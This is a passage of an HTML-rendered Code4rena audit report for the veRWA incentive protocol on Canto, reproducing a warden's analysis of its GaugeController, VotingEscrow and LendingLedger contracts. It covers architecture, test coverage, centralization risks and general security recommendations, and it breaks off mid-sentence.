href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L2</a>86</li>\n<li><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L</a>325</li>\n<li><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L355\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L355</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L472\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L472</a><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L486\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L486</a></li>\n</ul>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 8 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/446\">report highlighted below</a> by <strong>catellatech</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/472\">rjs</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/453\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/452\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/473\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/465\">0x73696d616f</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/215\">thekmj</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/138\">0xbrett8571</a>.</em></p>\n<h2 id=\"description-of-verwa-project\" style=\"position:relative;\"><a href=\"#description-of-verwa-project\" aria-label=\"description of verwa project permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description of <code>veRWA project</code></h2>\n<p>veRWA is an incentivization mechanism designed for Real World Assets (RWA) on the Canto platform. It operates similarly to the veCRV system with its liquidity gauge. Users have the option to lock up CANTO tokens for a duration of five years in the <code>VotingEscrow</code> contract, in exchange for receiving veCANTO tokens. </p>\n<p>Subsequently, they can participate in voting activities within the <code>GaugeController</code> for various credit markets that have been whitelisted by the governance. Users who provide liquidity in these credit markets can claim <code>CANTO</code> tokens (provided by the CANTO governance) from the <code>LendingLedger</code> contract, based on their proportional contribution.</p>\n<p>To illustrate, let’s consider credit markets X, Y, and Z where Alice, Bob, and Charlie contribute liquidity. In the scenario of credit market X, assuming Alice contributes 60% of the liquidity, Bob contributes 30%, and Charlie contributes 10% at a specific time (epoch), and let’s assume that credit market X receives 40% of all votes at that epoch. Consequently, the allocations would be:</p>\n<ul>\n<li>Alice: <code>40% * 60% = 24%</code> of all allocated CANTO tokens for this epoch.</li>\n<li>Bob: <code>40% * 30% = 12%</code> of all allocated CANTO tokens for this epoch.</li>\n<li>Charlie: <code>40% * 10% = 4%</code> of all allocated CANTO tokens for this epoch.</li>\n</ul>\n<p>This mechanism aims to incentivize participation and liquidity provision in credit markets backed by real world assets on the Canto platform.</p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p><img src=\"https://raw.githubusercontent.com/catellaTech/unknow/main/Diagrama%20sin%20t%C3%ADtulo.drawio.png\" alt=\"veRWA\"></p>\n<h2 id=\"1--approach-we-followed-when-reviewing-the-code\" style=\"position:relative;\"><a href=\"#1--approach-we-followed-when-reviewing-the-code\" aria-label=\"1  approach we followed when reviewing the code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1- Approach we followed when reviewing the code</h2>\n<p>To begin, we assessed the code’s scope, which guided our approach to reviewing and analyzing the project.</p>\n<h3 id=\"scope-1\" style=\"position:relative;\"><a href=\"#scope-1\" aria-label=\"scope 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h3>\n<ul>\n<li>\n<p><strong>GaugeController.sol</strong>:</p>\n<ul>\n<li>The <code>GaugeController</code> contract is like a translated version of Curve’s <code>GaugeController</code> written in Solidity. It simplifies the gauge types to just one type for veRWA. This leads to other changes in the code. The way gauges (lending markets) are approved is also different from the original design.</li>\n</ul>\n<p>The controller lets users vote on how much weight a gauge should have in distributing CANTO tokens during a specific period (epoch). It also allows checking the historical relative weights of all gauges.</p>\n</li>\n<li>\n<p><strong>VotingEscrow.sol</strong>: </p>\n<ul>\n<li>The <code>VotingEscrow</code> system used here is based on an existing setup from FIAT DAO, which itself was built by modifying Curve’s original design. In this version, a few changes were made, like allowing the use of native tokens instead of ERC20 tokens. Additionally, a fixed lock time of 5 years was added, which restarts every time an action is taken.</li>\n</ul>\n</li>\n<li>\n<p><strong>LendingLedger.sol</strong>: </p>\n<ul>\n<li>The lending ledger keeps track of how much cryptocurrency users have contributed to a specific market over time. To do this, authorized markets need to notify the ledger whenever a user deposits or withdraws funds. The Canto governance manages the rewards by sending CANTO tokens to the contract, controlling the amount allocated for each epoch. </li>\n</ul>\n</li>\n</ul>\n<p>With this understanding, we proceeded to scrutinize and audit the code through a series of structured steps:</p>\n<p><img src=\"https://raw.githubusercontent.com/catellaTech/unknow/main/VERWA1.drawio.png\" alt=\"veRWA\"></p>\n<h2 id=\"2--analysis-of-the-code-base\" style=\"position:relative;\"><a href=\"#2--analysis-of-the-code-base\" aria-label=\"2  analysis of the code base permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2- Analysis of the code base</h2>\n<p>The <strong><code>GaugeController</code> contract</strong> is a fundamental component of the <code>veRWA project</code> is responsible for enabling users to vote on the distribution of CANTO tokens and managing information related to weights and changes in “gauges” (credit markets) within the <code>veRWA project</code>.</p>\n<ul>\n<li>Here’s a breakdown of the key parts of this contract:</li>\n</ul>\n<p><img src=\"https://github.com/catellaTech/unknow/blob/main/Gauge.drawio.png?raw=true\" alt=\"&#x60;GaugeController&#x60;\"></p>\n<p>The <strong><code>VotingEscrow</code> contract</strong> is responsible for managing users locking and voting power. </p>\n<ul>\n<li>I’ll explain the key components and functionality of the contract in simpler terms:</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/catellaTech/unknow/main/Gauge.drawio.png\" alt=\"&#x60;VotingEscrow&#x60;\"></p>\n<p>The <strong><code>LendingLedger</code> contract</strong> is responsible for tracking balances and rewards in lending markets. Users can synchronize their balances, claim rewards, and the governance can set rewards and control the whitelist of lending markets.</p>\n<ul>\n<li>Let’s delve into its functionality and structure:</li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/catellaTech/unknow/main/lending.drawio.png\" alt=\"&#x60;LendingLedger&#x60;\"></p>\n<h2 id=\"3--test-analysis\" style=\"position:relative;\"><a href=\"#3--test-analysis\" aria-label=\"3  test analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3- Test analysis</h2>\n<p>The audit scope of the contracts to be audited is 95% and it should be aimed to be 100%.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">What is the overall line coverage percentage provided by your tests?: 95%</span></span></code></pre>\n<h3 id=\"how-could-they-have-done-it-better\" style=\"position:relative;\"><a href=\"#how-could-they-have-done-it-better\" aria-label=\"how could they have done it better permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How could they have done it better?</h3>\n<p>While the provided code seems to be functional, there are always areas for improvement to ensure better security, efficiency, and readability in both the contract and the protocol. </p>\n<ul>\n<li>\n<p>Here are some potential areas for improvement:</p>\n<ol>\n<li>\n<p><strong>Code Comments and Documentation</strong>:</p>\n<ul>\n<li>The code lacks detailed comments explaining the purpose and functionality of each function. Adding comprehensive comments can help other developers understand the codebase more easily.</li>\n</ul>\n</li>\n<li>\n<p><strong>Access Control</strong>:</p>\n<ul>\n<li>While the contract includes a onlyGovernance modifier for certain functions, it’s essential to ensure that access control mechanisms are robust and properly implemented throughout the protocol. Consider using a more standardized access control library for clarity and security.</li>\n</ul>\n</li>\n<li>\n<p><strong>Error Handling and Assertions</strong>:</p>\n<ul>\n<li>The code uses require statements for error checking, which is good. However, more informative error messages could be added to provide better context about what went wrong during transactions.</li>\n</ul>\n</li>\n<li>\n<p><strong>Code Organization</strong>:</p>\n<ul>\n<li>The code could be organized into separate files or contracts for improved modularity and readability. This can make it easier to understand the different components of the protocol.</li>\n</ul>\n</li>\n<li>\n<p><strong>Security Audits</strong>:</p>\n<ul>\n<li>A thorough security audit by professionals can help identify vulnerabilities and potential attack vectors that might not be obvious. Security should always be a top priority.</li>\n</ul>\n</li>\n<li>\n<p><strong>Event Logging</strong>:</p>\n<ul>\n<li>Adding well-defined event logs can help external services and users better understand the state changes and actions taken within the contract.</li>\n</ul>\n</li>\n<li>\n<p><strong>More Comprehensive Testing</strong>:</p>\n<ul>\n<li>Extensive testing, including unit tests, integration tests, and possibly even external audits, can help ensure the robustness and correctness of the protocol.</li>\n</ul>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"4--architectural\" style=\"position:relative;\"><a href=\"#4--architectural\" aria-label=\"4  architectural permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4- Architectural</h2>\n<p><img src=\"https://gist.github.com/PaperParachute/84792e9e9d99c953907222b35da4d7a0\" alt=\"Test\"></p>\n<ul>\n<li><strong>Users</strong>:\nUsers interact with the <code>veRWA project</code> through their actions, such as depositing tokens, voting on governance proposals, and participating in lending markets.</li>\n<li>\n<p><strong><code>VotingEscrow.sol</code></strong>:</p>\n<ul>\n<li>This contract manages the voting and token locking system. Users can lock their tokens for a specified period and take part in community decision-making. The contract might be designed to encourage active participation and reward users for their voting actions.</li>\n</ul>\n</li>\n<li>\n<p><strong><code>GaugeController.sol</code></strong>:</p>\n<ul>\n<li>The <code>GaugeController</code> contract could manage the “gauges” that influence reward distribution. This contract likely defines how rewards are allocated among different markets or assets based on their relative weights.</li>\n</ul>\n</li>\n<li>\n<p><strong><code>LendingLedger.sol</code></strong>:</p>\n<ul>\n<li>This contract is the core of the lending and rewards functionality. Users can deposit tokens into lending markets, earn cTokens, and receive rewards in the form of <code>CANTO</code> tokens. The contract keeps track of user balances, total balances in each lending market, and other relevant metrics. It also allows users to claim rewards and enables governance to configure rewards.</li>\n</ul>\n</li>\n</ul>\n<p>This overview provides a general understanding of how the different components interact within the <code>veRWA project</code>.</p>\n<h2 id=\"5--documents\" style=\"position:relative;\"><a href=\"#5--documents\" aria-label=\"5  documents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5- Documents</h2>\n<ul>\n<li>It would be helpful if the Documentation explained how the ecosystem works from a basic contract level so that it is easier to digest for developers, users and auditors looking to integrate into the <code>veRWA project</code>, it is recommended to add the architectural design to the documents as infographic</li>\n<li>I would also recommend adding quality Medium articles, it’s a great way to provide an in-depth look at many of the topics in the project and is used by many blockchain projects.</li>\n</ul>\n<h2 id=\"6--systemic--centralization-risks\" style=\"position:relative;\"><a href=\"#6--systemic--centralization-risks\" aria-label=\"6  systemic  centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6- Systemic &#x26; Centralization Risks</h2>\n<p>Here’s an analysis of potential systemic and centralization risks in the provided contracts:</p>\n<h3 id=\"systemic-risks\" style=\"position:relative;\"><a href=\"#systemic-risks\" aria-label=\"systemic risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Systemic Risks:</h3>\n<ul>\n<li>\n<p><strong>Epoch-Based System</strong>: </p>\n<ul>\n<li>The protocol relies heavily on the concept of epochs (measured in weeks) for various functions like rewards, claims, and balances. If there’s a flaw in how epochs are calculated or if the timing gets disrupted due to network issues, it could affect the accuracy of rewards and claims.</li>\n</ul>\n</li>\n<li>\n<p><strong>Reward Calculations</strong>: </p>\n<ul>\n<li>The calculation of rewards involves several variables, including market weights, balances, and reward amounts. If any of these variables are inaccurately calculated, it could lead to incorrect distribution of rewards, potentially causing dissatisfaction among users.</li>\n</ul>\n</li>\n<li>\n<p><strong>Lending Market Whitelist</strong>: </p>\n<ul>\n<li>The whitelist for lending markets is controlled by governance. If there’s centralized control over whitelisting and governance decisions, it could result in concentration of power and decision-making, which goes against the principles of decentralization.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"centralization-risks\" style=\"position:relative;\"><a href=\"#centralization-risks\" aria-label=\"centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Centralization Risks:</h3>\n<ul>\n<li>\n<p><strong>Governance Control</strong>: </p>\n<ul>\n<li>The governance address is hard-coded in the contract. If the governance becomes inactive or malicious, it could lead to a centralized decision-making process or even potential abuse of power.</li>\n</ul>\n</li>\n<li>\n<p><strong>Market Whitelisting</strong>: </p>\n<ul>\n<li>The ability for governance to whitelist or blacklist lending markets could lead to centralization if decisions are made without involving the broader community. Centralized control over market participation can hinder innovation and competition.</li>\n</ul>\n</li>\n<li>\n<p><strong>Reward Settings</strong>: </p>\n<ul>\n<li>Governance’s control over reward settings introduces centralization in determining how rewards are distributed. Mismanagement of rewards or a lack of transparency in setting rewards could lead to dissatisfaction among users.</li>\n</ul>\n</li>\n<li>\n<p><strong>Dependent Contracts</strong>: </p>\n<ul>\n<li>The protocol relies on external contracts like <code>VotingEscrow</code> and <code>GaugeController</code>. If these contracts are compromised or misconfigured, it could impact the overall functionality of the <code>veRWA project</code>.</li>\n</ul>\n</li>\n<li>\n<p><strong>Rewards Allocation</strong>: </p>\n<ul>\n<li>The distribution of rewards based on market weights controlled by <code>GaugeController</code> could be centralized if the controller’s decisions are not well-distributed or transparently managed.</li>\n</ul>\n</li>\n</ul>\n<p>It’s important to address these risks through careful auditing, community involvement, decentralization measures, and ongoing monitoring. The protocol should strive to minimize centralization, ensure transparency, and have contingency plans for potential disruptions or flaws in the system.</p>\n<h2 id=\"7--security-approach-of-the-project\" style=\"position:relative;\"><a href=\"#7--security-approach-of-the-project\" aria-label=\"7  security approach of the project permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7- Security Approach of the Project</h2>\n<p>What the project should add in the understanding of Security?</p>\n<ul>\n<li>\n<p><strong>Input Validation</strong>: </p>\n<ul>\n<li>Ensuring that inputs to functions are properly validated and sanitized to prevent unexpected behavior or vulnerabilities like integer overflows/underflows, division by zero, etc.</li>\n</ul>\n</li>\n<li>\n<p><strong>Access Control</strong>: </p>\n<ul>\n<li>Implementing proper access controls to restrict sensitive functions and data to authorized entities only. It seems that there is already an onlyGovernance modifier in the <code>LendingLedger.sol</code> contract for certain functions, which suggests some level of access control.</li>\n</ul>\n</li>\n<li>\n<p><strong>External Contract Interaction</strong>: </p>\n<ul>\n<li>Ensuring secure interactions with external contracts to prevent unexpected behavior or vulnerabilities. This involves validating return values, using established interfaces, and handling failures gracefully.</li>\n</ul>\n</li>\n<li>\n<p><strong>Audits and Testing</strong>: </p>\n<ul>\n<li>Conducting comprehensive security audits by reputable third-party auditors and performing extensive testing, including unit testing, integration testing, and scenario-based testing.</li>\n</ul>\n</li>\n<li>\n<p><strong>Code Simplicity and Clarity</strong>: </p>\n<ul>\n<li>Keeping the codebase simple and easy to understand, which can reduce the risk of introducing vulnerabilities due to complex logic.</li>\n</ul>\n</li>\n<li>\n<p><strong>Known Vulnerability Mitigation-</strong>: </p>\n<ul>\n<li>Staying updated with the latest developments in the blockchain and smart contract security space to mitigate known vulnerabilities.</li>\n</ul>\n</li>\n<li>\n<p><strong>Emergency Measures</strong>: </p>\n<ul>\n<li>Implementing mechanisms for pausing or upgrading contracts in case of vulnerabilities or emergencies.</li>\n</ul>\n</li>\n<li>\n<p><strong>Continuous Monitoring and Response</strong>: </p>\n<ul>\n<li>Implementing monitoring and response mechanisms to detect anomalies or attacks and respond to them in a timely manner.</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"8--other-audit-reports-and-automated-findings\" style=\"position:relative;\"><a href=\"#8--other-audit-reports-and-automated-findings\" aria-label=\"8  other audit reports and automated findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>8- Other Audit Reports and Automated Findings</h2>\n<p><strong>Automated Findings:</strong>\n<a href=\"https://github.com/code-423n4/2023-08-verwa/blob/main/bot-report.md\">https://github.com/code-423n4/2023-08-verwa/blob/main/bot-report.md</a></p>\n<h2 id=\"9--new-insights-and-learning-from-this-audit\" style=\"position:relative;\"><a href=\"#9--new-insights-and-learning-from-this-audit\" aria-label=\"9  new insights and learning from this audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>9- New insights and learning from this audit</h2>\n<p>The insights and learnings that could be gained from analyzing the provided smart contracts from the <code>veRWA project</code>. </p>\n<p><strong>Complexity and Design Patterns</strong>:\n- Analyzing these contracts might offer insights into how complex DeFi protocols are designed and implemented. Understanding the interplay of different contracts, data structures, and design patterns could deepen your understanding of decentralized applications.</p>\n<p><strong>Governance and Voting</strong>:\n- By studying the 